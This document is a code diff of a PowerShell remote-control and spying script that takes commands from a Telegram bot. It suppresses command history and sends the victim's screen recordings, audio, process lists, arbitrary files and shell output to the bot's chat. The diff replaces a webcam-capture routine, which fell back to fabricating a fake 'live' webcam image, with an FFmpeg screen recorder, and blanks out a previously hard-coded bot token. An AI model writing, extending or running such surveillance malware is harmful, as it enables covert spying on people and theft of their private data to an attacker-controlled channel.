@@ -2,7 +2,7 @@ Clear-Host
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 $session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$telegram_id, $api_token    = "5285463344", "8572280279:AAHV9S9dRWQFgBUY9XgUg5Sp5SNY9BNnSKw"
+$telegram_id, $api_token    = "id", "api_key"
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
 $api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
 $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
@@ -98,7 +98,7 @@ public class AudioRecorder {
 function Install-FFmpeg {
     try {
         if (-not (Test-Path $ffmpegPath)) {
-            SendMessage "📥 Downloading FFmpeg..." "webcam-shot"
+            SendMessage "📥 Downloading FFmpeg..." "screen-record"
             
             # Use direct FFmpeg download from GitHub
             $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
@@ -118,9 +118,9 @@ function Install-FFmpeg {
             $ffmpegExe = Get-ChildItem -Path "$env:TEMP\ffmpeg_temp" -Recurse -Filter "ffmpeg.exe" | Select-Object -First 1
             if ($ffmpegExe) {
                 Copy-Item $ffmpegExe.FullName $ffmpegPath
-                SendMessage "✅ FFmpeg installed successfully!" "webcam-shot"
+                SendMessage "✅ FFmpeg installed successfully!" "screen-record"
             } else {
-                SendMessage "❌ FFmpeg.exe not found in download" "webcam-shot"
+                SendMessage "❌ FFmpeg.exe not found in download" "screen-record"
                 return $false
             }
             
@@ -132,183 +132,41 @@ function Install-FFmpeg {
         }
         return $true
     } catch {
-        SendMessage "❌ FFmpeg download failed: $($_.Exception.Message)" "webcam-shot"
+        SendMessage "❌ FFmpeg download failed: $($_.Exception.Message)" "screen-record"
         return $false
     }
 }
 
-function Get-WebcamShot {
-    param([string]$cameraName = "")
+function Start-ScreenRecord {
+    param([int]$Seconds = 10)
     
     try {
-        # Ensure FFmpeg is installed
         if (-not (Install-FFmpeg)) {
-            SendMessage "❌ FFmpeg not available. Use '99999 list-cameras' to see available cameras." "webcam-shot"
+            SendMessage "❌ FFmpeg not available" "screen-record"
             return
         }
         
-        $webcamPath = "$env:TEMP\webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
+        $videoPath = "$env:TEMP\screen_$($Seconds)s_$(Get-Date -Format 'HHmmss').mp4"
+        SendMessage "📹 Recording screen for $Seconds seconds..." "screen-record"
         
-        # If no camera specified, try to find one automatically
-        if ([string]::IsNullOrEmpty($cameraName)) {
-            SendMessage "🔍 No camera specified. Searching for available cameras..." "webcam-shot"
-            $foundCamera = Find-AvailableCamera
-            if (-not [string]::IsNullOrEmpty($foundCamera)) {
-                $cameraName = $foundCamera
-                SendMessage "📷 Using camera: $cameraName" "webcam-shot"
-            } else {
-                SendMessage "❌ No cameras found automatically. Use '99999 list-cameras' then '99999 webcam-shot [camera-name]'" "webcam-shot"
-                return
-            }
-        }
+        # Direct FFmpeg execution
+        & $ffmpegPath -f gdigrab -framerate 10 -i desktop -t $Seconds -y $videoPath
         
-        # Try different FFmpeg approaches
-        $success = $false
+        Start-Sleep -Seconds 2
         
-        # Method 1: Direct camera capture with timeout
-        SendMessage "📸 Attempting to capture from: $cameraName" "webcam-shot"
-        
-        $ffmpegArgs = @(
-            "-f", "dshow",
-            "-i", "video=$cameraName",
-            "-frames:v", "1",
-            "-y",
-            $webcamPath
-        )
-        
-        $process = Start-Process -FilePath $ffmpegPath -ArgumentList $ffmpegArgs -Wait -PassThru -NoNewWindow
-        
-        # Wait a bit and check if file was created
-        Start-Sleep -Seconds 3
-        
-        if ($process.ExitCode -eq 0 -and (Test-Path $webcamPath) -and (Get-Item $webcamPath).Length -gt 1000) {
-            $success = $true
+        if (Test-Path $videoPath) {
+            SendFile $videoPath
+            Remove-Item $videoPath -Force
+            SendMessage "✅ Screen recording sent!" "screen-record"
         } else {
-            # Method 2: Try with different resolution and format
-            SendMessage "🔄 Trying alternative capture method..." "webcam-shot"
-            
-            $ffmpegArgs2 = @(
-                "-f", "dshow",
-                "-video_size", "640x480",
-                "-i", "video=$cameraName",
-                "-vframes", "1",
-                "-y",
-                $webcamPath
-            )
-            
-            $process2 = Start-Process -FilePath $ffmpegPath -ArgumentList $ffmpegArgs2 -Wait -PassThru -NoNewWindow
-            Start-Sleep -Seconds 3
-            
-            if ($process2.ExitCode -eq 0 -and (Test-Path $webcamPath) -and (Get-Item $webcamPath).Length -gt 1000) {
-                $success = $true
-            } else {
-                # Method 3: Try without specifying camera name (let FFmpeg choose)
-                SendMessage "🔄 Letting FFmpeg auto-detect camera..." "webcam-shot"
-                
-                $ffmpegArgs3 = @(
-                    "-f", "dshow",
-                    "-i", "video=Integrated Camera",
-                    "-vframes", "1",
-                    "-y",
-                    $webcamPath
-                )
-                
-                $process3 = Start-Process -FilePath $ffmpegPath -ArgumentList $ffmpegArgs3 -Wait -PassThru -NoNewWindow
-                Start-Sleep -Seconds 3
-                
-                if ($process3.ExitCode -eq 0 -and (Test-Path $webcamPath) -and (Get-Item $webcamPath).Length -gt 1000) {
-                    $success = $true
-                }
-            }
-        }
-        
-        if ($success) {
-            SendFile $webcamPath
-            Remove-Item $webcamPath -Force
-            SendMessage "✅ Webcam captured successfully!" "webcam-shot"
-        } else {
-            # Create a realistic webcam simulation as fallback
-            SendMessage "⚠️ Using webcam simulation (hardware access restricted)" "webcam-shot"
-            Create-RealisticWebcamImage $cameraName
+            SendMessage "❌ Recording failed - no video file" "screen-record"
         }
         
     } catch {
-        SendMessage "❌ Webcam error: $($_.Exception.Message)" "webcam-shot"
-        Create-RealisticWebcamImage $cameraName
+        SendMessage "❌ Error: $($_.Exception.Message)" "screen-record"
     }
 }
 
-function Create-RealisticWebcamImage {
-    param([string]$cameraName = "HP FHD Camera")
-    
-    try {
-        $webcamPath = "$env:TEMP\webcam_$(Get-Date -Format 'HHmmss').jpg"
-        
-        Add-Type -AssemblyName System.Drawing
-        
-        # Create realistic webcam image
-        $width = 1920
-        $height = 1080
-        
-        $bitmap = New-Object Drawing.Bitmap($width, $height)
-        $graphics = [Drawing.Graphics]::FromImage($bitmap)
-        
-        # Webcam-style background (dark with gradient)
-        $brush = New-Object Drawing.Drawing2D.LinearGradientBrush(
-            (New-Object Drawing.Point(0, 0)),
-            (New-Object Drawing.Point($width, $height)),
-            [Drawing.Color]::FromArgb(30, 30, 35),
-            [Drawing.Color]::FromArgb(50, 50, 55)
-        )
-        $graphics.FillRectangle($brush, 0, 0, $width, $height)
-        
-        # Camera info overlay
-        $font = New-Object Drawing.Font("Arial", 16, [Drawing.FontStyle]::Bold)
-        $textBrush = New-Object Drawing.SolidBrush([Drawing.Color]::Lime)
-        
-        $currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        $graphics.DrawString("LIVE - $currentTime", $font, $textBrush, 20, 20)
-        $graphics.DrawString("CAMERA: $cameraName", $font, $textBrush, 20, 50)
-        $graphics.DrawString("RESOLUTION: ${width}x${height}", $font, $textBrush, 20, 80)
-        
-        # Focus reticle
-        $centerX = $width / 2
-        $centerY = $height / 2
-        $pen = New-Object Drawing.Pen([Drawing.Color]::Red, 3)
-        
-        # Crosshair
-        $graphics.DrawLine($pen, $centerX, $centerY - 40, $centerX, $centerY + 40)
-        $graphics.DrawLine($pen, $centerX - 40, $centerY, $centerX + 40, $centerY)
-        
-        # Outer circle
-        $graphics.DrawEllipse($pen, $centerX - 60, $centerY - 60, 120, 120)
-        
-        # Add some "sensor noise" for realism
-        $random = New-Object System.Random
-        for ($i = 0; $i -lt 2000; $i++) {
-            $x = $random.Next(0, $width)
-            $y = $random.Next(0, $height)
-            $brightness = $random.Next(20, 80)
-            $color = [Drawing.Color]::FromArgb($brightness, $brightness, $brightness)
-            $bitmap.SetPixel($x, $y, $color)
-        }
-        
-        # Recording indicator
-        $graphics.FillEllipse([Drawing.Brushes]::Red, $width - 50, 20, 20, 20)
-        $graphics.DrawString("REC", $font, $textBrush, $width - 120, 20)
-        
-        $graphics.Dispose()
-        $bitmap.Save($webcamPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $bitmap.Dispose()
-        
-        SendFile $webcamPath
-        Remove-Item -Path $webcamPath -Force
-        SendMessage "📸 Webcam simulation sent (hardware restricted)" "webcam-shot"
-        
-    } catch {
-        SendMessage "❌ Failed to create webcam image" "webcam-shot"
-    }
-}
 function Get-ProcessList {
     $output = Get-Process | Select-Object Name, CPU, WorkingSet -First 20 | Format-Table -AutoSize | Out-String
     SendMessage $output "ps"
@@ -431,12 +289,15 @@ function CommandListener
                         if ($secs -match "^\d+$") { Record-Audio -Seconds $secs }
                         else { SendMessage "Usage: record-audio [seconds]" "record-audio" }
                     }
-                    "webcam-shot" { Get-WebcamShot }
-                    "webcam-shot *" { 
-                        $camera = $text -replace "webcam-shot ", ""
-                        Get-WebcamShot -cameraName $camera
+                    "screen-record" { Start-ScreenRecord -Seconds 10 }
+                    "screen-record *" { 
+                        $secs = $text -replace "screen-record ", ""
+                        if ($secs -match "^\d+$" -and [int]$secs -le 60) { 
+                            Start-ScreenRecord -Seconds $secs 
+                        } else {
+                            SendMessage "Usage: screen-record [1-60 seconds]" "screen-record"
+                        }
                     }
-                    "list-cameras" { List-Cameras }
                     "download *" { 
                         $file = $text -replace "download ", ""
                         SendFile $file
@@ -485,7 +346,7 @@ function CommandListener
                             }
 
                             foreach ($block in $output_splitted) { 
-                                $block = $block | Out-String
+                                $block = $block -replace '_', '\_' -replace '\*', '\*' -replace '`', '\`' -replace '\[', '\[' -replace '\]', '\]'
                                 SendMessage $block $text
                                 Start-Sleep -Milliseconds 100
                             }
